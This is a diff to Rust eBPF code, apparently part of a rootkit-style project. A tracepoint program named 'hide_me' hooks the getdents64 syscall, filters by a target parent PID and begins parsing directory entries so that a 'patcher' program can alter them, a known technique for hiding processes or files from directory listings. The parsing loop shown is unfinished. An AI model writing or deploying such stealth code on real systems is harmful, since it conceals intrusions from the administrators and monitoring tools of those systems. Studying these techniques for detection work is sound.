@@ -4,7 +4,10 @@
 use core::mem::offset_of;
 
 use aya_ebpf::{
-    helpers::{bpf_get_current_pid_tgid, bpf_get_current_task, bpf_probe_read_kernel},
+    helpers::{
+        bpf_get_current_pid_tgid, bpf_get_current_task, bpf_probe_read_kernel,
+        gen::bpf_probe_read_user,
+    },
     macros::{map, tracepoint},
     maps::{HashMap, ProgramArray},
     programs::TracePointContext,
@@ -18,16 +21,26 @@ mod vmlinux;
 
 const PROG_HANDLER: u32 = 0;
 const PROG_PATCHER: u32 = 1;
+const MAX_FILE_LEN: usize = 16;
 
 #[map]
 static JUMP_TABLE: ProgramArray = ProgramArray::with_max_entries(2, 0);
+
 #[allow(non_upper_case_globals)]
 #[map]
-static map_buffs: HashMap<u64, u64> = HashMap::<u64, u64>::with_max_entries(8192, 0);
+static map_buffs: HashMap<usize, u64> = HashMap::<usize, u64>::with_max_entries(8192, 0);
 
 #[allow(non_upper_case_globals)]
 #[map]
 static target_ppid: HashMap<u8, i32> = HashMap::<u8, i32>::with_max_entries(1, 0);
+
+#[allow(non_upper_case_globals)]
+#[map]
+static map_bytes_read: HashMap<usize, i32> = HashMap::<usize, i32>::with_max_entries(8192, 0);
+
+#[allow(non_upper_case_globals)]
+#[map]
+static map_to_patch: HashMap<usize, i32> = HashMap::<usize, i32>::with_max_entries(8192, 0);
 
 #[tracepoint]
 pub fn hide_me(ctx: TracePointContext) -> u32 {
@@ -43,7 +56,7 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
 
     let the_target_ppid = the_target_ppid.unwrap();
 
-    let pid_tgid = bpf_get_current_pid_tgid();
+    let pid_tgid = bpf_get_current_pid_tgid() as usize;
 
     if *the_target_ppid != 0 {
         let ppid = unsafe {
@@ -56,7 +69,7 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
             bpf_probe_read_kernel::<i32>(
                 (real_parent.unwrap() as usize + offset_of!(task_struct, tgid)) as *const i32,
             )
-                .unwrap()
+            .unwrap()
         };
 
         if ppid != *the_target_ppid {
@@ -86,7 +99,7 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
 fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
     // cat /sys/kernel/debug/tracing/events/syscalls/sys_exit_getdents64/format
     // field:long ret;                         offset:16; size:8; signed:1;
-    let pid_tgid = bpf_get_current_pid_tgid();
+    let pid_tgid = bpf_get_current_pid_tgid() as usize;
     let total_bytes_read: i64 = unsafe { ctx.read_at(16).unwrap() };
 
     if total_bytes_read <= 0 {
@@ -98,6 +111,25 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
         let pid = pid_tgid >> 32;
 
         let d_reclen = 0;
+
+        let mut dirp: *const linux_dirent64 = core::ptr::null();
+
+        let mut filename: [u8; MAX_FILE_LEN] = [0; MAX_FILE_LEN];
+
+        let mut bpos = 0;
+
+        let pBPOS = unsafe { map_bytes_read.get(&pid_tgid) };
+
+        if let Some(pBPOS) = pBPOS {
+            bpos = *pBPOS;
+        }
+
+        for i in 0..128 {
+            if bpos >= total_bytes_read as i32 {
+                break;
+            }
+            dirp = (buff_addr + bpos as u64) as *const linux_dirent64;
+        }
     } else {
         return Ok(0);
     }
